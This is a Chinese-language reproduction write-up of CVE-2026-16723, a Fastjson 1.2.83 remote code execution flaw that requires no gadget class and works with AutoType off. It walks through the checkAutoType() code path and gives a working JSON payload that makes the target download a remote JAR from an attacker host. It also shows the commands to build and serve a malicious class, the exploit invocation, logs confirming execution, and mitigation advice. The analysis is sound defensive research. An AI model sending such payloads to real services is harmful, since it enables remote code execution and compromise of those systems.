CVE-2026-16723 漏洞复现
Fastjson 1.2.83 无需 Gadget 远程代码执行漏洞
项目	内容
CVE 编号	CVE-2026-16723
CVSS 评分	9.0 (Critical)
影响版本	fastjson 1.2.68 – 1.2.83
漏洞类型	CWE-20 (输入验证不当), CWE-502 (反序列化)
利用前提	Spring Boot FatJar + JDK 8 + 目标可出网
AutoType	不需要开启
Gadget 依赖	不需要任何第三方 Gadget 类
发现者	Kirill Firsov (@k_firsov, FearsOff)
一、漏洞概述
CVE-2026-16723 是 Fastjson 1.2.x 系列中一个严重的远程代码执行漏洞。与此前所有 Fastjson 反序列化漏洞不同，该漏洞：

不需要开启 AutoType：利用点在 checkAutoType() 的注解探测逻辑中，而非传统的 AutoType 黑白名单
不需要经典 Gadget：payload 是攻击者自定义的远程 class 文件
类型绑定无法防御：JSON.parseObject(body, Dto.class) 同样可被利用，因为 @type 的探测发生在 DTO 绑定之前
二、漏洞原理
2.1 攻击链概览

复制
攻击者构造 payload: {"@type":"jar:http:..ATTACKER:PORT.probe!.POC","x":1}
            ↓
Fastjson DefaultJSONParser 解析 @type → 调用 checkAutoType()
            ↓
checkAutoType() 内部:
  1. 黑白名单 hash 检查 → 通过（jar:http:.. 前缀不在黑名单中）
  2. typeName.replace('.','/') + ".class" → "jar:http://ATTACKER:PORT/probe!/POC.class"
  3. defaultClassLoader.getResourceAsStream(resource)
     → LaunchedURLClassLoader 解析 jar:http:// URL
     → 远程下载攻击者的 JAR（SSRF）
  4. ClassReader 扫描下载的 class → 发现 @JSONType 注解 → jsonType = true
  5. TypeUtils.loadClass(typeName, defaultClassLoader, true)
     → defineClass() → 类被定义，<clinit> 静态初始化块执行 → RCE!
  6. if (jsonType) return clazz; → 短路返回，跳过后续安全检查
2.2 关键代码路径
com.alibaba.fastjson.parser.ParserConfig.checkAutoType() (fastjson 1.2.83):


复制
// 阶段 1: 注解探测（SSRF 触发点）
boolean jsonType = false;
InputStream is = null;
try {
    String resource = typeName.replace('.', '/') + ".class";  // (1) 构造资源路径
    if (defaultClassLoader != null) {
        is = defaultClassLoader.getResourceAsStream(resource);  // (2) SSRF!
    } else {
        is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
    }
    if (is != null) {
        ClassReader classReader = new ClassReader(is, true);
        TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
        classReader.accept(visitor);
        jsonType = visitor.hasJsonType();  // (3) 检测 @JSONType
    }
} catch (Exception e) { /* 静默吞掉异常 */ }
 
// 阶段 2: 类加载（RCE 触发点）
if (autoTypeSupport || jsonType || expectClassFlag) {
    boolean cacheClass = autoTypeSupport || jsonType;
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);  // (4) RCE!
}
 
if (clazz != null) {
    if (jsonType) {
        return clazz;  // (5) 短路返回，不经过后续安全检查
    }
}
2.3 为什么能绕过黑名单
Fastjson 1.2.83 使用 FNV1a_64 渐进式 hash 进行黑名单匹配。jar:http:.. 开头的 typeName 的所有前缀 hash 均不在 denyHashCodes 和 internalDenyHashCodes 中，因此完整地通过了黑名单检查。

2.4 为什么需要 LaunchedURLClassLoader
普通的 AppClassLoader 的 getResourceAsStream() 只在本地 classpath 中查找资源。Spring Boot 的 LaunchedURLClassLoader 注册了自定义的 jar: URL 协议处理器 (org.springframework.boot.loader.jar.Handler)，该处理器在处理 jar:http:// URL 时会回退到 JDK 原生的 sun.net.www.protocol.jar.Handler，后者会通过 HTTP 下载远程 JAR 文件。

2.5 为什么 JDK 8 是完整 RCE 的条件
JDK 8: defineClass1 原生方法不验证类名中的 : 和 ! 等特殊字符，允许定义名为 jar:http://... 的类
JDK 9+: VM 层面增加了严格的类名校验，defineClass1 会拒绝包含非法字符的类名，抛出 ClassFormatError。此时漏洞降级为 SSRF（远程 JAR 被下载但类无法被定义）
三、复现环境
组件	版本
JDK	1.8.0_202
Spring Boot	2.7.18
Fastjson	1.2.83
ASM	9.6 (用于生成恶意 class)
OS	Windows 10
四、复现步骤
4.1 生成恶意 probe.jar

复制
cd exploit
javac -cp "lib\asm-9.6.jar;lib\fastjson-1.2.83.jar" GenProbe.java
java -cp ".;lib\asm-9.6.jar;lib\fastjson-1.2.83.jar" GenProbe 127.0.0.1 19090 --marker-only
GenProbe 使用 ASM 生成一个特殊的 class 文件:

内部类名: jar:http://2130706433:19090/probe!/POC (与 jar: URL 对齐)
注解: @JSONType (让 Fastjson 的 hasJsonType() 返回 true)
静态初始化块: 创建标记文件 PWNED_CVE-2026-16723
4.2 启动 HTTP 托管

复制
cd exploit/www
python -m http.server 19090
4.3 启动靶场 (JDK 8)

复制
"C:\Program Files\Java\jdk1.8.0_202\bin\java.exe" -jar target-app/target/fastjson-rce-target-1.0.0.jar
靶场在启动时将 ParserConfig.getGlobalInstance().setDefaultClassLoader() 设置为 LaunchedURLClassLoader。

4.4 发送 Exploit

复制
python exploit/exp.py -u http://127.0.0.1:18080/parse -poc http://127.0.0.1:19090/probe
Payload: {"@type":"jar:http:..2130706433:19090.probe!.POC","x":1}

五、复现结果
5.1 靶场控制台输出

复制
[/parse] body: {"@type": "jar:http:..2130706433:19090.probe!.POC", "x": 1}
REMOTE POC <clinit> EXECUTED — CVE-2026-16723 MARKER-ONLY MODE
远程恶意类的 <clinit> 在靶场 JVM 中成功执行。

5.2 HTTP 服务器日志

复制
::ffff:127.0.0.1 - - [24/Jul/2026 14:49:09] "GET /probe HTTP/1.1" 200 -
靶场通过 SSRF 成功拉取了攻击者托管的恶意 JAR。

5.3 RCE 标记文件

复制
*** PWNED FILE EXISTS - RCE CONFIRMED ***
文件: E:\LDYVUL-2026-00130847\target-app\PWNED_CVE-2026-16723
5.4 API 响应

复制
{
  "parsedClass": "jar:http:..2130706433:19090.probe!.POC",
  "parsed": "jar:http:..2130706433:19090.probe!.POC@4a50122c",
  "ok": true,
  "autoTypeSupport": false
}
注意 autoTypeSupport: false — 证明漏洞在 AutoType 关闭的默认配置下即可触发。

六、JDK 版本影响对比
JDK 版本	SSRF (远程JAR下载)	RCE (代码执行)	原因
JDK 8	✅	✅	defineClass1 不校验类名
JDK 9+	✅	❌	VM 层面拒绝非法类名
JDK 23	✅	❌	同上
七、修复建议
优先级	措施	说明
P0	启用 SafeMode	-Dfastjson.parser.safeMode=true 完全禁用 autoType 及资源探测
P0	迁移至 Fastjson 2.x	Fastjson 2 移除了基于 getResourceAsStream 的类型探测逻辑
P1	使用 1.2.83_noneautotype 构建	Alibaba 官方发布的安全加固版本
P1	升级至 JDK 9+	RCE 降级为 SSRF（但 SSRF 本身仍然是安全风险）
P2	限制出网	阻止应用对外发起 HTTP 连接，阻断远程 JAR 加载
P2	WAF 拦截	拦截请求体中包含 @type + jar: 的 JSON 数据
